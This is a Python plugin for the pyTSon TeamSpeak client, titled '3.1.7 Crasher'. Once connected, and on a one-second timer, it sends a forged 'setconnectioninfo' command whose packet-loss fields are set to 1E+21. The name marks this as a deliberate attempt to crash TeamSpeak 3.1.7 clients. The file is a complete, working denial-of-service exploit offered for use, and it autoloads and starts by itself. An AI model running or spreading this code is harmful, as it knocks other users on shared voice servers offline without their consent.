from ts3plugin import ts3plugin
from PythonQt.QtCore import QTimer, Qt
from bluscream import timestamp, sendCommand
from traceback import format_exc
import ts3defines, ts3lib

class crasher_3_1_7(ts3plugin):
    name = "3.1.7 Crasher"
    apiVersion = 21
    requestAutoload = True
    version = "1"
    author = "Bluscream"
    description = "( .) ( .)"
    offersConfigure = False
    commandKeyword = ""
    infoTitle = None
    menuItems = [(ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 0, "Toggle " + name, "")]
    hotkeys = []
    debug = True
    timers = {}

    def __init__(self):
        if self.debug: ts3lib.printMessageToCurrentTab("{0}[color=orange]{1}[/color] Plugin for pyTSon by [url=https://github.com/{2}]{2}[/url] loaded.".format(timestamp(), self.name, self.author))

    def stop(self):
        for schid, timer in self.timers.items():
            self.stopTimer(schid)

    def onMenuItemEvent(self, schid, atype, menuItemID, selectedItemID):
        if atype != ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL or menuItemID != 0: return
        if schid in self.timers: self.stopTimer(schid)
        else: self.startTimer(schid)

    def startTimer(self, schid):
        ts3lib.printMessageToCurrentTab("starting timer")
        self.timers[schid] = QTimer()
        self.timers[schid].timeout.connect(self.tick)
        # interval = calculateInterval(schid, ts3defines.AntiFloodPoints.SETCONNECTIONINFO, self.name)
        self.timers[schid].start(1000)
        ts3lib.printMessageToCurrentTab("started timer")

    def stopTimer(self, schid):
        if schid in self.timers:
            self.timers[schid].stop()
            del self.timers[schid]

    def onConnectStatusChangeEvent(self, schid, newStatus, errorNumber):
        if newStatus == ts3defines.ConnectStatus.STATUS_CONNECTION_ESTABLISHED:
            self.startTimer(schid)
        elif newStatus == ts3defines.ConnectStatus.STATUS_DISCONNECTED:
             self.stopTimer(schid)

    def tick(self):
        try:
            ts3lib.printMessageToCurrentTab("[color=green]tick")
            sendCommand(self.name, self.buildConnectionInfo()) # TODO: ADD SCHID
            ts3lib.printMessageToCurrentTab("[color=red]tick")
        except: print(format_exc())

    def buildConnectionInfo(self):
        cmd = "setconnectioninfo"
        cmd += " connection_ping=0"
        cmd += " connection_ping_deviation=0.2181"
        cmd += " connection_packets_sent_speech=0"
        cmd += " connection_packets_sent_keepalive=60"
        cmd += " connection_packets_sent_control=128"
        cmd += " connection_bytes_sent_speech=0"
        cmd += " connection_bytes_sent_keepalive=2520"
        cmd += " connection_bytes_sent_control=12604"
        cmd += " connection_packets_received_speech=0"
        cmd += " connection_packets_received_keepalive=60"
        cmd += " connection_packets_received_control=124"
        cmd += " connection_bytes_received_speech=0"
        cmd += " connection_bytes_received_keepalive=2460"
        cmd += " connection_bytes_received_control=21986"
        cmd += " connection_server2client_packetloss_speech=1E+21"
        cmd += " connection_server2client_packetloss_keepalive=1E+21"
        cmd += " connection_server2client_packetloss_control=1E+21"
        cmd += " connection_server2client_packetloss_total=1E+21"
        cmd += " connection_bandwidth_sent_last_second_speech=0"
        cmd += " connection_bandwidth_sent_last_second_keepalive=83"
        cmd += " connection_bandwidth_sent_last_second_control=471"
        cmd += " connection_bandwidth_sent_last_minute_speech=0"
        cmd += " connection_bandwidth_sent_last_minute_keepalive=82"
        cmd += " connection_bandwidth_sent_last_minute_control=425"
        cmd += " connection_bandwidth_received_last_second_speech=0"
        cmd += " connection_bandwidth_received_last_second_keepalive=81"
        cmd += " connection_bandwidth_received_last_second_control=106"
        cmd += " connection_bandwidth_received_last_minute_speech=0"
        cmd += " connection_bandwidth_received_last_minute_keepalive=80"
        cmd += " connection_bandwidth_received_last_minute_control=743"
        return cmd
